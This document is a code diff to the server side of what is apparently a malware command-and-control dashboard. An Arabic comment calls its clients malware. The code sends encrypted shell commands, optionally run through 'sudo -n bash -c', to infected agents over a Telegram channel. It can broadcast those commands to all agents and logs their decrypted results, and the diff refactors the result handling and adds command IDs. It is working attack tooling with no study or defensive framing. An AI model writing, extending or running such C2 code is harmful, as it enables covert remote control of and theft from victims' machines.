@@ -213,6 +213,54 @@ def save_command_to_db(command, client_id, status="pending", cwd=None):
         logger.error(f"Failed to save command to DB: {e}")
         return None
 
+
+def _telegram_apply_result_to_commands_db(client_id: str, result_obj: dict, decrypted_for_log: str) -> None:
+    """Update pending command row from Telegram RESULT (matches by command_id or client_id / broadcast)."""
+    cmd_text = result_obj.get("command", "") or ""
+    result_txt = result_obj.get("result", "") or ""
+    cmd_cwd = result_obj.get("cwd")
+    cid_row = result_obj.get("command_id")
+    try:
+        cid_row = int(cid_row) if cid_row is not None else None
+    except (TypeError, ValueError):
+        cid_row = None
+
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        if cid_row is not None:
+            row = conn.execute(
+                'SELECT id FROM commands WHERE id=? AND status="pending"',
+                (cid_row,),
+            ).fetchone()
+        else:
+            row = conn.execute(
+                'SELECT id FROM commands WHERE status="pending" AND (client_id=? OR client_id=?) '
+                'ORDER BY created_at ASC LIMIT 1',
+                (client_id, "all"),
+            ).fetchone()
+        if row:
+            conn.execute(
+                'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
+                (result_txt, time.time(), cmd_cwd, row[0]),
+            )
+        else:
+            conn.execute(
+                'INSERT INTO commands (command, client_id, status, result, created_at, executed_at, cwd) '
+                'VALUES (?,?,?,?,?,?,?)',
+                (cmd_text, client_id, "done", result_txt, time.time(), time.time(), cmd_cwd),
+            )
+        conn.commit()
+        conn.close()
+    except Exception as db_err:
+        logger.error(f"TG result DB error: {db_err}")
+        return
+
+    if client_id in clients:
+        clients[client_id]["last_seen"] = time.time()
+        _persist_client_last_seen_db(client_id)
+    save_log_to_db(time.time(), "result", decrypted_for_log, client_id)
+    logger.info(f"📥 TG Result from {client_id}: {cmd_text[:60]}")
+
 def load_data_from_db():
     global clients, clients_data, commands
     try:
@@ -426,6 +474,17 @@ def _tg_decrypt(aes_key: bytes, encrypted_b64: str) -> str:
     cipher = _AES_MOD.new(aes_key, _AES_MOD.MODE_GCM, nonce=nonce)
     return cipher.decrypt_and_verify(ciphertext, tag).decode()
 
+
+def _tg_cmd_plaintext(final_cmd: str, row_id) -> str:
+    """Embed DB row id in CMD payload so RESULT updates the dashboard row (fixes client_id=all vs agent id)."""
+    if row_id is None:
+        return final_cmd
+    try:
+        rid = int(row_id)
+    except (TypeError, ValueError):
+        return final_cmd
+    return json.dumps({"cmd": final_cmd, "command_id": rid})
+
 def listen_telegram_group():
     """خيط في الخلفية - يستقبل رسائل المالوير من الجروب ويسجلهم في الداش"""
     global _tg_last_update_id
@@ -515,44 +574,15 @@ def listen_telegram_group():
                                 parts = text.split(":", 2)
                                 if len(parts) < 3:
                                     continue
-                                client_id        = parts[1]
+                                client_id = parts[1].strip()
                                 encrypted_result = parts[2]
 
                                 if client_id not in tg_sessions:
                                     continue
 
-                                decrypted  = _tg_decrypt(tg_sessions[client_id], encrypted_result)
+                                decrypted = _tg_decrypt(tg_sessions[client_id], encrypted_result)
                                 result_obj = json.loads(decrypted)
-                                cmd_text   = result_obj.get("command", "")
-                                result_txt = result_obj.get("result", "")
-                                cmd_cwd    = result_obj.get("cwd")
-
-                                # تحديث أقدم أمر pending لهذا الكلاينت، وإلا نُنشئ سجلاً جديداً
-                                try:
-                                    conn = sqlite3.connect(DB_PATH)
-                                    row = conn.execute(
-                                        'SELECT id FROM commands WHERE client_id=? AND status="pending" '
-                                        'ORDER BY created_at ASC LIMIT 1',
-                                        (client_id,)
-                                    ).fetchone()
-                                    if row:
-                                        conn.execute(
-                                            'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
-                                            (result_txt, time.time(), cmd_cwd, row[0])
-                                        )
-                                    else:
-                                        conn.execute(
-                                            'INSERT INTO commands (command, client_id, status, result, created_at, executed_at, cwd) '
-                                            'VALUES (?,?,?,?,?,?,?)',
-                                            (cmd_text, client_id, "done", result_txt, time.time(), time.time(), cmd_cwd)
-                                        )
-                                    conn.commit()
-                                    conn.close()
-                                except Exception as db_err:
-                                    logger.error(f"TG result DB error: {db_err}")
-
-                                save_log_to_db(time.time(), "result", decrypted, client_id)
-                                logger.info(f"📥 TG Result from {client_id}: {cmd_text[:60]}")
+                                _telegram_apply_result_to_commands_db(client_id, result_obj, decrypted)
 
                             except Exception as e:
                                 logger.error(f"TG Result error: {e}")
@@ -650,40 +680,9 @@ def _handle_protocol_text(text: str):
             if len(parts) >= 3:
                 client_id = parts[1].strip()
                 if client_id in tg_sessions:
-                    decrypted  = _tg_decrypt(tg_sessions[client_id], parts[2])
+                    decrypted = _tg_decrypt(tg_sessions[client_id], parts[2])
                     result_obj = json.loads(decrypted)
-                    cmd_text   = result_obj.get("command", "")
-                    result_txt = result_obj.get("result", "")
-                    cmd_cwd    = result_obj.get("cwd")
-
-                    try:
-                        conn = sqlite3.connect(DB_PATH)
-                        row = conn.execute(
-                            'SELECT id FROM commands WHERE client_id=? AND status="pending" '
-                            'ORDER BY created_at ASC LIMIT 1',
-                            (client_id,)
-                        ).fetchone()
-                        if row:
-                            conn.execute(
-                                'UPDATE commands SET status="done", result=?, executed_at=?, cwd=? WHERE id=?',
-                                (result_txt, time.time(), cmd_cwd, row[0])
-                            )
-                        else:
-                            conn.execute(
-                                'INSERT INTO commands (command, client_id, status, result, created_at, executed_at, cwd) '
-                                'VALUES (?,?,?,?,?,?,?)',
-                                (cmd_text, client_id, "done", result_txt, time.time(), time.time(), cmd_cwd)
-                            )
-                        conn.commit()
-                        conn.close()
-                    except Exception as db_err:
-                        logger.error(f"TG result DB error: {db_err}")
-
-                    if client_id in clients:
-                        clients[client_id]["last_seen"] = time.time()
-                        _persist_client_last_seen_db(client_id)
-                    save_log_to_db(time.time(), "result", decrypted, client_id)
-                    logger.info(f"📥 TG Result from {client_id}: {cmd_text[:60]}")
+                    _telegram_apply_result_to_commands_db(client_id, result_obj, decrypted)
         except Exception as e:
             logger.error(f"TG Result error: {e}")
 
@@ -889,7 +888,8 @@ def receive_command():
     if client_id == "[C2-Server]" and "[C2-Server]" in tg_sessions:
         row_id = save_command_to_db(cmd, client_id)
         final_cmd = f"sudo -n bash -c '{cmd}'" if use_sudo else cmd
-        _tg_send_to_channel(f"CMD:[C2-Server]:{_tg_encrypt(tg_sessions['[C2-Server]'], final_cmd)}")
+        body = _tg_cmd_plaintext(final_cmd, row_id)
+        _tg_send_to_channel(f"CMD:[C2-Server]:{_tg_encrypt(tg_sessions['[C2-Server]'], body)}")
         logger.info(f"📤 TG Command → [C2-Server]: {cmd}")
         return jsonify({"status": "sent_via_telegram", "command_id": row_id})
 
@@ -906,9 +906,10 @@ def receive_command():
     # كلاينت تيليجرام - يُرسل الأمر عبر قناة Telegram مشفراً
     if client_id == "all":
         row_id = save_command_to_db(cmd, client_id)
+        body = _tg_cmd_plaintext(final_cmd, row_id)
         for tg_cid in list(telegram_clients):
             if tg_cid in tg_sessions:
-                _tg_send_to_channel(f"CMD:{tg_cid}:{_tg_encrypt(tg_sessions[tg_cid], final_cmd)}")
+                _tg_send_to_channel(f"CMD:{tg_cid}:{_tg_encrypt(tg_sessions[tg_cid], body)}")
         # HTTP clients يستقبلون عبر queue كالعادة
         http_clients = [c for c in clients if c not in telegram_clients]
         if http_clients:
@@ -920,7 +921,8 @@ def receive_command():
         if client_id not in tg_sessions:
             return jsonify({"error": "No TG session for this client"}), 400
         row_id = save_command_to_db(cmd, client_id)
-        _tg_send_to_channel(f"CMD:{client_id}:{_tg_encrypt(tg_sessions[client_id], final_cmd)}")
+        body = _tg_cmd_plaintext(final_cmd, row_id)
+        _tg_send_to_channel(f"CMD:{client_id}:{_tg_encrypt(tg_sessions[client_id], body)}")
         logger.info(f"📤 TG Command sent to {client_id}: {cmd}")
         return jsonify({"status": "sent_via_telegram", "command_id": row_id})
 
